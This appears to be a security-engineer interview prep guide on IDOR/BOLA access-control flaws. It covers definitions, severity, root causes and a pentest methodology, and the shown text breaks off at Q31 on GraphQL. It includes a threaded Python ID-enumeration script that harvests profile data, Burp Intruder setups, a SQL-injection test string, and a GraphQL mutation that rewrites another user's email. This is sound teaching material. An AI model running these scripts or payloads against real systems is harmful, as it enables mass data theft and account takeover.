# SECURITY ENGINEER INTERVIEW PREP - PART 2
# IDOR & BOLA (Broken Object Level Authorization) - Complete Deep Dive
## Jagdeep Singh | 100 Real Q&A

---

## SECTION A: FUNDAMENTALS (Q1-25)

### Q1: What is IDOR? Define it precisely.
**A:** IDOR (Insecure Direct Object Reference) is an access control vulnerability where an application uses user-supplied input to access objects (records, files, accounts) directly without verifying that the user is authorized to access that specific object. The "direct" means there's a direct mapping between user input and the object - typically through IDs in URLs, parameters, or request bodies.

**Simplest example:**
```
GET /api/invoices/100   ← User 100's invoice (legitimate)
GET /api/invoices/101   ← User 101's invoice (IDOR if accessible)
```

### Q2: What does IDOR stand for? Break down each word.
**A:**
- **I**nsecure: Lacks proper security controls
- **D**irect: The object reference is exposed directly to user input
- **O**bject: A resource - file, record, account, document
- **R**eference: How we point to that object (ID, filename, key)

Together: A vulnerability where direct references to objects are not properly secured.

### Q3: What is BOLA? How does it differ from IDOR?
**A:** **BOLA (Broken Object Level Authorization)** is OWASP API Security's term for the same class of vulnerability, but defined more broadly:

| Aspect | IDOR | BOLA |
|--------|------|------|
| Origin | OWASP Top 10 (web) | OWASP API Security Top 10 |
| Scope | Direct object references with predictable IDs | Any object-level authorization failure |
| Format | Usually numeric/sequential IDs | Any object reference (UUIDs, hashes, names) |
| Era | Older term (since 2007) | Modern term (since 2019 API Top 10) |
| Focus | Reference predictability | Authorization logic |

**Key insight:** BOLA includes IDOR but extends to:
- Authorization broken even with UUIDs/random IDs
- Authorization fails for indirect references (e.g., "my-latest-order")
- Authorization missing entirely
- Cross-tenant access in multi-tenant systems

**In practice:** Use IDOR when ID is guessable/sequential. Use BOLA for API contexts or broader authorization failures.

### Q4: Where does IDOR rank in OWASP?
**A:**
- **OWASP Top 10 2021**: A01 - Broken Access Control (#1, most critical)
- **OWASP API Security Top 10 2023**: API1 - Broken Object Level Authorization (#1)

Both lists put this at the top. It's the most common and impactful web/API vulnerability today.

### Q5: What CVSS score range is typical for IDOR?
**A:**
- **Read-only IDOR (view other user's data)**: 5.3 - 7.5 (Medium-High)
- **IDOR allowing modification**: 6.5 - 8.1 (High)
- **IDOR allowing deletion**: 7.1 - 8.6 (High)
- **IDOR exposing PII/financial data**: 7.5 - 9.0 (High-Critical)
- **IDOR on admin endpoints**: 8.8 - 9.8 (Critical)
- **IDOR with privilege escalation**: 9.0 - 9.8 (Critical)

**Factors affecting score:**
- Authentication required vs unauthenticated (unauthenticated = higher)
- Read vs Write vs Delete (delete = highest)
- Data sensitivity (PII, financial, health = higher)
- Scope (one user vs many users)
- Authorization complexity (admin-only = critical)

### Q6: What's the difference between horizontal and vertical IDOR?
**A:**

**Horizontal IDOR (most common):**
- User accessing data of another user at SAME privilege level
- Example: Customer A viewing Customer B's orders
- Same role, different identity

```
Logged in as user_100 (regular customer)
GET /api/orders/100 → My orders ✓
GET /api/orders/101 → User 101's orders ✗ (Horizontal IDOR)
```

**Vertical IDOR:**
- Lower-privilege user accessing higher-privilege data
- Example: Regular user accessing admin endpoints
- Different roles

```
Logged in as user_100 (regular customer)
GET /admin/users/list → Admin endpoint, should be 403
If returns 200 with all users → Vertical IDOR
```

**Both can coexist:**
- App may have horizontal IDOR (users can view each other's data)
- AND vertical IDOR (users can access admin endpoints)
- Test for both during pentest

### Q7: Real-world impact of IDOR - give 5 concrete examples
**A:**

**Example 1: Banking - Account Statement Exposure**
- Endpoint: `GET /api/accounts/{accountNumber}/statements`
- IDOR allows viewing any account's statements
- Impact: Massive PII breach, financial data exposed
- Compliance: GLBA, PCI-DSS violations

**Example 2: Healthcare - Patient Records**
- Endpoint: `GET /api/patients/{patientId}/records`
- IDOR exposes medical history
- Impact: HIPAA violation, lawsuits, regulatory fines
- Severity: Critical (CVSS 9.0+)

**Example 3: E-commerce - Order Manipulation**
- Endpoint: `POST /api/orders/{orderId}/cancel`
- IDOR allows cancelling other users' orders
- Impact: Customer harassment, lost revenue
- Business: Major reputational damage

**Example 4: SaaS - Cross-Tenant Data Leak**
- Endpoint: `GET /api/tenants/{tenantId}/users`
- IDOR allows accessing other companies' data
- Impact: Trade secret theft, B2B contract violations
- Legal: Massive enterprise lawsuits

**Example 5: Government - Document Disclosure**
- Endpoint: `GET /api/documents/{docId}/download`
- IDOR exposes confidential government documents
- Impact: National security implications
- Real example: First American Financial (2019) - 885M documents exposed via IDOR

### Q8: What are common locations of IDOR in modern apps?
**A:**

**Top 15 locations I check in every pentest:**

1. **User profiles**: `/users/{id}/profile`
2. **Settings**: `/users/{id}/settings`
3. **Documents/Files**: `/documents/{id}/download`
4. **Invoices/Orders**: `/orders/{id}`
5. **Messages**: `/messages/{id}` or `/conversations/{id}`
6. **Comments**: `/comments/{id}/edit`
7. **API tokens**: `/users/{id}/api-keys`
8. **Subscription/Billing**: `/subscriptions/{id}`
9. **Notification settings**: `/users/{id}/notifications`
10. **Address book**: `/users/{id}/addresses/{addressId}`
11. **Tickets/Support**: `/tickets/{id}`
12. **Reports**: `/reports/{id}`
13. **Reviews/Ratings**: `/reviews/{id}`
14. **Webhooks**: `/users/{id}/webhooks`
15. **Activity logs**: `/users/{id}/activity`

**Multi-tenant SaaS-specific:**
- `/tenants/{tenantId}/...` everything
- `/organizations/{orgId}/...`
- `/companies/{companyId}/...`
- `/workspaces/{workspaceId}/...`

### Q9: Why do developers create IDOR vulnerabilities?
**A:**

**Common root causes:**

**1. Authentication mistaken for authorization**
- Developer thinks: "User is logged in, so they can access this"
- Reality: Login doesn't mean they should access THIS specific record

**2. Trusting client-side state**
- Frontend filters to show only user's data
- Backend doesn't enforce: any ID works

**3. Direct database lookups without ownership checks**
```python
# Vulnerable
def get_order(order_id):
    return Order.objects.get(id=order_id)  # No owner check!

# Secure
def get_order(order_id, user):
    return Order.objects.get(id=order_id, owner=user)
```

**4. Copy-paste from documentation**
- Many tutorials show simple GET by ID
- Developers copy without adding authorization

**5. Microservice trust boundaries**
- Service A trusts Service B's authorization
- Service B trusts Service A's authorization
- Neither actually checks - vulnerability slips through

**6. Late-stage authorization additions**
- App built without auth, added later
- Some endpoints missed in refactor

**7. Admin endpoints exposed accidentally**
- Internal admin tools accidentally deployed publicly
- No auth check because "only admins know the URL"

**8. ORM lazy loading**
- `User.find(id)` doesn't enforce ownership
- Developer forgets to add WHERE owner=current_user

### Q10: How is IDOR different from broken access control?
**A:**

**Broken Access Control** is the BROAD category. IDOR is a SUBSET.

**Access Control Issues:**
```
├── Authentication Issues
├── Session Management Issues
└── Authorization Issues (Access Control)
    ├── Object-Level (IDOR/BOLA)  ← We're here
    ├── Function-Level (admin endpoints accessible to non-admins)
    ├── Field-Level (mass assignment, exposed sensitive fields)
    └── Business Logic Authorization
```

**IDOR vs Function-Level:**
```
IDOR: /api/users/100/profile → /api/users/101/profile (object change)
Function: /api/users/profile → /api/admin/users (function change)
```

**Both are Broken Access Control, different sub-types.**

### Q11: What makes IDOR different from forced browsing?
**A:**

**Forced browsing** = Guessing URLs to find unprotected resources
- `/admin/` (page not linked)
- `/backup.zip`
- `/.git/config`

**IDOR** = Changing IDs in existing parameterized URLs
- `/users/100` → `/users/101`
- Parameter manipulation, not URL discovery

**Sometimes overlap:**
- `/users/100/edit` → `/admin/users/100/edit` (forced browsing path + IDOR concept)

**Key difference:**
- Forced browsing: Finding hidden endpoints
- IDOR: Manipulating known endpoint parameters

### Q12: What identifiers are common in IDOR? (Beyond integers)
**A:**

**Sequential integers (easiest):**
- 1, 2, 3, ... 999, 1000
- Trivially enumerable
- Most insecure

**Hashed/Encoded IDs (better but breakable):**
- Base64: `aW52b2ljZV8xMjM=` decodes to `invoice_123`
- MD5 of sequential IDs (rainbow tables)
- Short hashes (collisions possible)

**UUIDs (best practice):**
- `550e8400-e29b-41d4-a716-446655440000`
- 128-bit, practically unguessable
- Still vulnerable if leaked elsewhere

**Predictable UUIDs (UUID v1, sometimes v3/v5):**
- UUID v1 = timestamp + MAC address
- Can be reverse-engineered if you have one example
- UUID v4 (random) is the safe choice

**Other identifiers attackers manipulate:**
- Email addresses: `user@example.com` → enumerable
- Usernames: `john_doe` → guessable
- Slugs: `acme-corp` → company names
- Timestamps: `created_at=1640000000` → date-based references
- File paths: `/files/2024/01/report.pdf` → time/date enumeration

**Testing approach:** Even if UUIDs used, look for:
- Where UUIDs are exposed (URLs, JSON responses, JavaScript)
- Whether you can list UUIDs anywhere (enumeration endpoints)
- If old endpoints still accept integer IDs (legacy support = backdoor)

### Q13: What's "indirect" object reference and how does it relate?
**A:**

**Direct reference:**
```
GET /api/documents/12345
```

**Indirect reference (mapped):**
```
GET /api/my-latest-document
GET /api/documents/current
GET /api/account
```

The server resolves "current", "my-latest", "account" to actual IDs server-side based on session.

**Why indirect references can be more secure:**
- No ID exposed to user
- User can't manipulate what they don't see
- Server enforces context

**Why indirect references CAN STILL be vulnerable:**
```
GET /api/users/by-email?email=other-user@gmail.com
GET /api/orders/most-recent?for_user=victim
GET /api/files/by-name?name=admin-config.json
```

These are "indirect" but still take user input. BOLA covers these (IDOR is more direct ID-focused).

### Q14: Why is IDOR so common in modern APIs?
**A:**

**Reasons API IDOR is widespread:**

**1. REST conventions encourage ID-in-URL**
```
GET /api/users/{id}
GET /api/orders/{id}
GET /api/posts/{id}
```
Convention-driven design includes IDs publicly.

**2. Microservices = More API endpoints**
- Each service has its own auth
- Service-to-service calls
- Higher surface area

**3. API-first development**
- Backend built before frontend
- Auth added later
- Missed endpoints

**4. GraphQL complexity**
```graphql
query {
  user(id: "any-id") {
    privateData
    paymentMethods
  }
}
```
Each resolver needs authorization, easy to miss.

**5. Mobile apps trust their own UI**
- Mobile UI hides IDs from user
- Backend assumes mobile app filters correctly
- But mobile API can be reverse-engineered

**6. AJAX-heavy SPAs**
- Many endpoints, less attention per endpoint
- Authorization scattered across codebase

**7. Authorization libraries with footguns**
- Frameworks like Django REST Framework default to allowing reads
- Developers must explicitly add object permissions

### Q15: Mass assignment vs IDOR - related?
**A:**

**Mass Assignment** = Sending extra fields in requests that get bound to object properties.
**IDOR** = Accessing other users' objects.

**They can chain:**
**Step 1: IDOR finding**
```
PATCH /api/users/101/profile (you're user 100)
```
If allowed → IDOR

**Step 2: Mass assignment on top**
```json
PATCH /api/users/101/profile
{
  "name": "New Name",
  "role": "admin",         ← Mass assignment
  "is_verified": true,     ← Mass assignment
  "credit_balance": 99999  ← Mass assignment
}
```

If server accepts these extra fields:
- IDOR: Modified another user
- Mass assignment: Made them admin

**Combined impact: Critical (privilege escalation)**

**Defense:**
- Whitelist updatable fields explicitly
- Use DTOs/schemas
- Never `Object.assign(user, requestBody)`

### Q16: Is IDOR always about IDs in URLs?
**A:**

**No - IDOR can be in many request locations:**

**URL path:**
```
GET /api/users/100/profile
```

**Query parameters:**
```
GET /api/profile?userId=100
```

**Request body (JSON/XML):**
```json
POST /api/get-profile
{"userId": 100}
```

**Form data:**
```
POST /api/update
userId=100&name=John
```

**Cookies:**
```
Cookie: user_id=100; session=abc
```
Some apps trust cookie-set user IDs (terrible practice but exists).

**HTTP Headers:**
```
X-User-ID: 100
X-Tenant-ID: acme
```

**JWT claims:**
```json
{"user_id": 100, "tenant": "acme"}
```
If JWT not validated properly, can be tampered.

**WebSocket messages:**
```
{"action": "subscribe", "channelId": "private-user-100"}
```

**File names/paths:**
```
GET /uploads/user_100/profile.jpg
GET /reports/2024/01/user-100-report.pdf
```

**Indirectly via other parameters:**
```
GET /api/search?filter=user:100
```

**Always test ALL inputs, not just URL paths.**

### Q17: How do you systematically discover IDOR opportunities?
**A:**

**My systematic IDOR discovery process:**

**Phase 1: Map the application**
- Create two accounts (User A and User B)
- Document every URL/endpoint
- Note all parameters
- List all data each user has

**Phase 2: Identify object references**
- For every endpoint, ask: "Is there an ID-like value?"
- Numeric IDs, UUIDs, usernames, emails
- Paths, filenames

**Phase 3: Test horizontal access**
- For each ID-bearing endpoint:
  - Get User A's data (note IDs)
  - Switch to User B
  - Try accessing User A's IDs
- Track which endpoints respond with User A's data

**Phase 4: Test vertical access**
- Create regular user account
- Try admin endpoints
- Try with admin-format IDs (often /admin or /internal paths)

**Phase 5: Test enumeration**
- Sequential IDs: Just enumerate
- UUIDs: Try common ones (00000000-0000-0000-0000-000000000001 for admin)
- Test API endpoints that return lists (may expose other users' IDs)

**Phase 6: Test method variations**
- GET works? Try PUT, PATCH, DELETE
- API GET succeeds → try the same URL with POST data

**Phase 7: Test indirect references**
- Search by username/email
- Filter parameters
- "by-name" endpoints

**Phase 8: Document findings**
- Each IDOR clearly described
- Reproduction steps
- Impact assessment

### Q18: Common patterns that indicate IDOR likelihood?
**A:**

**Red flags suggesting IDOR likely present:**

**1. Sequential, low-numbered IDs in URLs**
- `/user/1`, `/user/2`, `/user/3`
- Suggests no UUID, easy enumeration

**2. URL contains current user's ID**
- `/profile/100` (you're user 100)
- Changing to /profile/101 is obvious test

**3. Authentication required to view "your own" data**
- Login-protected endpoints with IDs
- Suggests authorization separate from authentication

**4. Mobile/old apps**
- Older APIs less hardened
- Mobile apps often have weaker API auth

**5. Admin/legacy paths**
- `/admin/`, `/old/`, `/v1/`, `/internal/`
- Likely less protection

**6. Multi-tenant SaaS**
- Tenant ID in URL
- Cross-tenant testing critical

**7. JSON responses with lots of IDs**
- API returns `userId`, `companyId`, `documentId`
- Many tempting test targets

**8. Apps with complex permissions**
- More logic = more bugs
- Role/permission systems often have gaps

**9. New features**
- Recently added endpoints
- Less time for security review

**10. Endpoints without "owner" filtering**
- Generic list endpoints
- Missing `WHERE user_id = ?`

### Q19: Why are UUIDs not enough to prevent IDOR?
**A:**

**UUIDs are pseudo-random, hard to guess (~3.4 × 10^38 possibilities for v4).**

**But UUIDs alone don't prevent IDOR because:**

**1. UUIDs leak through legitimate channels:**
- Shared in URLs to other users
- Visible in JSON responses
- Logged in browser history
- Cached in proxies
- Sent in emails

**2. Application APIs may expose UUIDs:**
```
GET /api/recent-orders   
Response: [
  {"id": "uuid-1", "amount": 100, "owner_uuid": "user-uuid-2"}
]
```
Now you have other users' UUIDs.

**3. UUID v1 is predictable:**
- Contains timestamp + MAC address
- Sequential UUIDs from same server
- Can predict next UUID

**4. Old endpoints may accept legacy integer IDs:**
- Migration to UUIDs incomplete
- `/api/v1/users/100` still works

**5. Search endpoints expose data:**
```
GET /api/search?type=user&q=admin
Response: [{"uuid": "admin-uuid"}]
```

**6. Error messages leak UUIDs:**
```
GET /api/orders/wrong-uuid
Response: "Order wrong-uuid not found, did you mean abc-123-uuid?"
```

**7. Subscription/webhook URLs:**
```
Customer A subscribes: webhook URL contains their UUID
Customer B sees this URL in shared documentation
```

**Bottom line:** UUIDs are security through obscurity. Always combine with authorization checks.

### Q20: Real example of UUID-based IDOR (Bug bounty-style)
**A:**

**Scenario:** SaaS app uses UUIDs for everything.

**Discovery:**
- Endpoint: `GET /api/documents/{uuid}`
- App claims "UUIDs prevent IDOR"

**Initial test fails:**
- Random UUID: `GET /api/documents/00000000-1111-2222-3333-444444444444`
- Returns 404 (UUID doesn't exist)
- Other UUIDs also return 404
- App seems secure

**Then we find:**
- Public API endpoint: `GET /api/public/recent-activity`
- Returns last 10 activities across all tenants:
```json
[
  {"action": "document.shared", "document_uuid": "abc-123-def-456"},
  {"action": "document.created", "document_uuid": "xyz-789-uvw-012"}
]
```

**Attack:**
1. Poll `/api/public/recent-activity` over time
2. Collect document UUIDs from all tenants
3. Use collected UUIDs in `/api/documents/{uuid}`
4. Access other tenants' documents

**Result:** Cross-tenant data leak despite UUIDs.

**Lesson:** UUIDs alone aren't enough. Need:
- Authorization checks on every access
- Don't expose UUIDs in public endpoints
- Don't trust UUIDs as access tokens

### Q21: When is IDOR considered "Critical" severity?
**A:**

**IDOR escalates to Critical (CVSS 9.0+) when:**

**1. Unauthenticated IDOR**
- No login required
- Anyone on internet can exploit
- Mass exploitation possible

**2. Affects sensitive data**
- PII (SSN, passports, ID cards)
- Financial data (account numbers, balances)
- Health records (HIPAA)
- Credit card details

**3. Mass data exposure**
- Sequential IDs allow enumeration of all users
- One IDOR exposes entire database
- "Critical mass" of records

**4. Combined with privilege escalation**
- Can modify roles
- Can grant admin access
- Self-promotion to admin

**5. Allows account takeover**
- Change other users' passwords
- Modify their email (reset password)
- Add 2FA on their behalf

**6. Affects authentication tokens**
- Read/manipulate API keys
- Steal session tokens
- Generate tokens for other users

**7. Cross-tenant in SaaS**
- Cross-company data exposure
- B2B contract violations
- Trade secrets

**8. Regulatory implications**
- GDPR violations (EU)
- HIPAA violations (US healthcare)
- PCI-DSS violations (payment)
- SOX (financial)

**Example Critical IDOR (Real - First American Financial 2019):**
- Endpoint: `https://firstam.com/document/{seq_id}`
- 885 million documents exposed
- No authentication required
- Sequential IDs
- Personal financial data, SSNs, mortgage docs

### Q22: How does authorization model affect IDOR likelihood?
**A:**

**Authorization Models and IDOR Risk:**

**1. RBAC (Role-Based Access Control)**
```
Roles: Admin, Manager, User
Permissions tied to role
```
**IDOR risk:** Medium - role-based checks may not consider object ownership

**2. ABAC (Attribute-Based Access Control)**
```
Decisions based on attributes:
- User attributes (role, department)
- Resource attributes (owner, classification)
- Environmental (time, location)
```
**IDOR risk:** Low if properly implemented - object attributes considered

**3. ACL (Access Control List)**
```
Per-object permissions:
Document_123: [User_100: READ, User_101: WRITE]
```
**IDOR risk:** Low - explicit per-object permissions

**4. Discretionary Access Control (DAC)**
```
Resource owners control access
User who creates document controls who can access
```
**IDOR risk:** Medium - depends on sharing implementation

**5. Mandatory Access Control (MAC)**
```
System enforces classifications (TOP SECRET, CONFIDENTIAL)
Used in government/military
```
**IDOR risk:** Low - strict enforcement

**Most IDOR happens when:**
- RBAC used without object-level checks
- "User has role X" ≠ "User owns this specific object"
- Authorization at function level only, not data level

### Q23: How does API versioning affect IDOR testing?
**A:**

**Different API versions = Different attack surfaces:**

**1. Legacy v1 endpoints often less secure:**
```
/api/v1/users/{id}   - Original API, less hardened
/api/v2/users/{id}   - Newer, better security
/api/v3/users/{id}   - Latest, most hardened
```

**Test all versions when found.**

**2. Deprecation notes still working:**
- API docs say v1 deprecated
- Endpoint still responds
- Still vulnerable

**3. Version-specific bugs:**
- v1 fix didn't propagate to v2
- New v3 has new IDOR

**4. Beta/preview APIs:**
- `/api/beta/`
- `/api/preview/`
- Less reviewed, more bugs

**5. Internal APIs exposed externally:**
- `/api/internal/users` - "Should be internal only"
- Accessible from internet anyway

**6. GraphQL alongside REST:**
- REST endpoints fixed for IDOR
- GraphQL query with same data NOT fixed

**Testing approach:**
- Find all API versions (look in JS files, mobile apps, docs)
- Test same operation across versions
- Often older versions still work and are vulnerable

### Q24: What's the OWASP API Top 10 ranking and why does BOLA top it?
**A:**

**OWASP API Top 10 (2023):**

| # | Vulnerability |
|---|---|
| API1 | **Broken Object Level Authorization (BOLA)** ← TOP |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server Side Request Forgery |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

**Why BOLA is #1:**

1. **Most prevalent in APIs** - APIs designed around objects, IDs are inherent
2. **Highest impact** - Direct data breach in most cases
3. **Hardest to fix** - Requires every endpoint to authorize objects
4. **Easy to exploit** - Just change an ID
5. **Automation-friendly** - Bots can mass exploit
6. **Real-world incidents** - Most API breaches are BOLA

### Q25: What's the difference between API1 (BOLA) and API3 (Broken Object Property Level Authorization)?
**A:**

**API1 (BOLA):** Cannot access this OBJECT
**API3:** Can access object, but can see/modify FIELDS you shouldn't

**Example:**

**BOLA (API1):**
```
You're User 100
GET /api/users/101/profile  → BOLA if accessible (whole object exposed)
```

**Broken Object Property Level Authorization (API3):**
```
You're User 100
GET /api/users/100/profile  → Should work (your own profile)

But response includes:
{
  "name": "John",
  "email": "john@gmail.com",
  "internal_notes": "VIP customer",       ← Shouldn't see this
  "credit_limit": 50000,                  ← Shouldn't see this
  "fraud_score": 0.85                     ← Shouldn't see this
}
```

Or modification (mass assignment):
```
PATCH /api/users/100/profile
{
  "name": "New name",         ← OK
  "role": "admin",            ← Shouldn't be able to set
  "credit_limit": 999999      ← Shouldn't be able to modify
}
```

**Both are authorization issues at different granularity:**
- BOLA: Object-level (whole record)
- API3: Property-level (specific fields)

---

## SECTION B: TESTING METHODOLOGY (Q26-55)

### Q26: Walk me through your complete IDOR testing methodology
**A:**

**My systematic IDOR testing approach:**

**Step 1: Setup**
- Create at least 2 user accounts (User A, User B)
- If multi-tenant: Create accounts in 2 different organizations
- If multiple roles: Create user with each role
- Use clean accounts (no shared data)

**Step 2: Application mapping**
- Browse entire application as User A
- Use Burp Suite to capture all requests
- Document all endpoints and parameters
- Note authentication mechanisms

**Step 3: Identify object references**
- Search captured requests for ID patterns:
  - Numeric IDs in URL paths
  - UUIDs anywhere
  - User-specific identifiers
  - Resource references
- Burp Suite Logger++ helps filter

**Step 4: Create reference data**
- Document User A's IDs:
  - User ID: 100
  - Order IDs: 1001, 1002, 1003
  - Document IDs: doc-100-1, doc-100-2
- Switch to User B, capture their IDs

**Step 5: Test horizontal IDOR**
- As User A, try accessing User B's IDs
- For each endpoint:
  - GET request with User B's ID
  - Check response status, content
- Document all successes

**Step 6: Test vertical IDOR**
- Try admin endpoint paths:
  - `/admin/`, `/api/admin/`
  - Even if you're not admin
- Try internal/legacy paths
- Look for backup/debug endpoints

**Step 7: Test all HTTP methods**
- GET worked? Try PUT, PATCH, POST, DELETE
- Same URL, different methods
- Different security implications

**Step 8: Test enumeration**
- If IDs sequential: enumerate
- Use Burp Intruder with payload positions
- Look for valid vs invalid responses

**Step 9: Test indirect references**
- Search by email, username
- Filter parameters
- "by-name", "by-slug" endpoints

**Step 10: Test edge cases**
- Negative IDs
- Zero, null
- Very large numbers
- Special characters
- SQL-like syntax (1' OR '1'='1)
- Type confusion (string vs int)

**Step 11: Test with different auth states**
- No authentication
- Expired token
- Token from different user
- Token from different tenant

**Step 12: Document everything**
- Each IDOR with PoC
- CVSS scoring
- Impact assessment
- Remediation suggestion

### Q27: How do you find IDOR using Burp Suite specifically?
**A:**

**Burp Suite IDOR workflow:**

**1. Logger++ for tracking IDs:**
- Install Logger++ extension
- Filter by status code 200
- Search for patterns like `id=` or `userId`
- Identify endpoints with user-specific IDs

**2. Authentication switching:**
- Use Burp's "Sessions" feature
- Create session for User A
- Create session for User B
- Switch between them quickly

**3. Match and Replace:**
- Proxy → Options → Match and Replace
- Add rule: Replace `userId=100` with `userId=101`
- Browse normally, see what changes

**4. Intruder for enumeration:**
```
Request:
GET /api/users/§100§/profile

Payloads:
- Numbers from 1 to 1000
- UUIDs from collected list

Run attack, sort by response length
Different responses = potential IDOR
```

**5. Repeater for manual testing:**
- Send request to Repeater (Ctrl+R)
- Modify ID parameter
- Send (Ctrl+Space)
- Compare responses

**6. Autorize extension (MUST HAVE):**
- Install Autorize from BApp Store
- Configure with User A and User B sessions
- Browse as User A
- Autorize automatically tests if User B can access same resources
- Shows enforcement: Enforced (good) vs Bypassed (IDOR!)

**7. Comparer:**
- Compare two responses
- See differences
- Spot subtle authorization bypasses

**8. Collaborator for blind IDOR:**
- Some IDOR triggers backend webhooks
- Use Collaborator to detect

### Q28: How does Autorize extension work and how do you use it?
**A:**

**Autorize** is the GOAT IDOR detection tool in Burp.

**How it works:**
- You configure two tokens/cookies (low-priv and high-priv users)
- You browse as high-priv user
- Autorize replays each request with low-priv user's auth
- Detects if low-priv user can access high-priv resources

**Setup:**

1. **Install:**
   - Burp → Extensions → BApp Store → Autorize → Install

2. **Configure:**
   - Click "Autorize" tab
   - Enter Cookie/Authorization header of LOW-PRIVILEGE user
   - Example: `Cookie: SESSION=low_priv_user_session`
   - Click "Save"

3. **Start interception:**
   - Click "Autorize is off" to turn it on
   - Now logs all requests passing through proxy

4. **Browse as HIGH-PRIVILEGE user:**
   - Login as admin (or higher-privilege user)
   - Browse all features
   - Autorize automatically tests each request with low-priv credentials

5. **Review results:**
   - Each request shows three columns:
     - Original (high-priv response)
     - Modified (low-priv attempt response)
     - Status indicators

**Status indicators:**
- **Bypassed!** - IDOR/Access Control issue (BAD = vulnerability!)
- **Enforced!** - Authorization working
- **Is enforced??? (please configure enforcement detector)** - Needs your judgment

**Configure detectors for accuracy:**
- "Enforcement detector": Regex/text indicating enforcement (e.g., "Access Denied")
- "Detection filter": What constitutes enforcement
- "Authentication detector": Detect re-auth pages

**Pro tips:**
- Run during entire pentest
- Review "Bypassed!" findings carefully
- Some may be false positives (e.g., public endpoints)
- Combine with manual testing for complete coverage

### Q29: How do you efficiently enumerate IDs for IDOR testing?
**A:**

**Enumeration techniques:**

**1. Sequential ID enumeration (Intruder):**
```
GET /api/users/§§/profile

Payloads:
- Numbers: 1 to 10000
- Sniper attack type

Filter results by response length
```

**2. Burp Intruder with multiple positions:**
```
GET /api/§/§/profile

Payload set 1 (resource type): users, accounts, profiles, customers
Payload set 2 (ID): 1-1000

Cluster bomb attack
```

**3. From application data:**
- API endpoints often return lists with IDs:
```
GET /api/recent-orders
[{"id": 1001}, {"id": 1002}, ...]
```
- Use these IDs for IDOR testing

**4. Sitemap and robots.txt:**
```
/sitemap.xml may list resources with IDs
/robots.txt may disclose paths
```

**5. JavaScript files:**
- Often hardcode example IDs
- Reveal ID format/patterns
```javascript
// In bundle.js
const SAMPLE_USER_ID = 12345;
const DEMO_DOCUMENT = "doc-abc-123-xyz";
```

**6. From error messages:**
- Some errors leak IDs:
```
"User 555 not found"
```

**7. Burp Intruder + grep:**
- Send request with placeholder
- Grep response for ID-like patterns
- Use found IDs in subsequent requests

**8. Crawling with hakrawler:**
```bash
hakrawler -depth 5 -url https://target.com | grep -oE '[0-9a-f-]{36}'
```
Extracts UUIDs from crawled pages.

**9. Wayback Machine:**
- Old crawled URLs may have IDs
```
waybackurls target.com | grep "id=" | sort -u
```

**10. GitHub for leaked IDs:**
- Sometimes companies leak example IDs in public repos
- Use as starting point

### Q30: How do you write a Python script to automate IDOR testing?
**A:**

**Basic IDOR enumeration script:**

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# Configuration
TARGET_URL = "https://target.com/api/users/{}/profile"
COOKIES = {"SESSION": "your_session_token"}
ID_RANGE = range(1, 10001)
WORKERS = 20

# Track findings
findings = []

def test_id(user_id):
    url = TARGET_URL.format(user_id)
    try:
        response = requests.get(url, cookies=COOKIES, timeout=10)
        
        # Indicators of successful access (adjust per target)
        if response.status_code == 200 and len(response.content) > 100:
            # Check for user-specific data
            if "email" in response.text or "name" in response.text:
                findings.append({
                    "id": user_id,
                    "status": response.status_code,
                    "length": len(response.content),
                    "snippet": response.text[:200]
                })
                print(f"[+] IDOR confirmed: ID {user_id}")
    except Exception as e:
        pass

# Run with concurrency
with ThreadPoolExecutor(max_workers=WORKERS) as executor:
    executor.map(test_id, ID_RANGE)

# Save findings
import json
with open('idor_findings.json', 'w') as f:
    json.dump(findings, f, indent=2)

print(f"\nTotal IDOR findings: {len(findings)}")
```

**More advanced version with two users:**

```python
import requests
from typing import Dict, List

class IDORTester:
    def __init__(self, user_a_cookie: str, user_b_cookie: str):
        self.user_a_session = requests.Session()
        self.user_a_session.headers.update({"Cookie": user_a_cookie})
        
        self.user_b_session = requests.Session()
        self.user_b_session.headers.update({"Cookie": user_b_cookie})
        
        self.findings = []
    
    def get_user_a_data(self, endpoint: str) -> Dict:
        """Get baseline as User A"""
        response = self.user_a_session.get(endpoint)
        return {
            "status": response.status_code,
            "length": len(response.content),
            "data": response.text
        }
    
    def test_idor(self, endpoint: str) -> bool:
        """Test if User B can access User A's data"""
        baseline = self.get_user_a_data(endpoint)
        
        # User B tries same endpoint
        response_b = self.user_b_session.get(endpoint)
        
        # Compare responses
        if response_b.status_code == 200:
            # If User B gets similar data to User A, that's IDOR
            similarity = self.calculate_similarity(
                baseline["data"], response_b.text
            )
            
            if similarity > 0.8:  # 80% similar
                self.findings.append({
                    "endpoint": endpoint,
                    "user_a_response": baseline["length"],
                    "user_b_response": len(response_b.content),
                    "similarity": similarity,
                    "severity": "HIGH"
                })
                return True
        
        return False
    
    def calculate_similarity(self, s1: str, s2: str) -> float:
        """Simple Jaccard similarity"""
        set1 = set(s1.split())
        set2 = set(s2.split())
        intersection = len(set1 & set2)
        union = len(set1 | set2)
        return intersection / union if union else 0
    
    def test_multiple(self, endpoints: List[str]):
        """Test list of endpoints"""
        for endpoint in endpoints:
            print(f"Testing: {endpoint}")
            if self.test_idor(endpoint):
                print(f"  [!] IDOR FOUND")
            else:
                print(f"  [OK] Properly secured")

# Usage
tester = IDORTester(
    user_a_cookie="SESSION=user_a_token",
    user_b_cookie="SESSION=user_b_token"
)

# User A's endpoints (containing their IDs)
endpoints_to_test = [
    "https://target.com/api/users/100/profile",
    "https://target.com/api/orders/1001",
    "https://target.com/api/documents/doc-100-1",
]

tester.test_multiple(endpoints_to_test)
print(f"\nFindings: {len(tester.findings)}")
```

### Q31: What's the IDOR testing approach for GraphQL APIs?
**A:**

**GraphQL IDOR is different from REST:**

**1. Introspection check:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

If allowed, see all types and queries available.

**2. Identify queries that take IDs:**
```graphql
type Query {
  user(id: ID!): User
  order(id: ID!): Order
  document(id: ID!): Document
}
```

**3. Test each query with different IDs:**

As User A, try:
```graphql
{
  user(id: "user-b-uuid") {
    id
    email
    privateData
    paymentMethods {
      cardLast4
    }
  }
}
```

If returns User B's data → BOLA

**4. Mutation IDOR:**
```graphql
mutation {
  updateProfile(userId: "user-b-uuid", input: {
    email: "attacker@gmail.com"
  }) {
    success
  }
}
```

**5. Batched queries:**
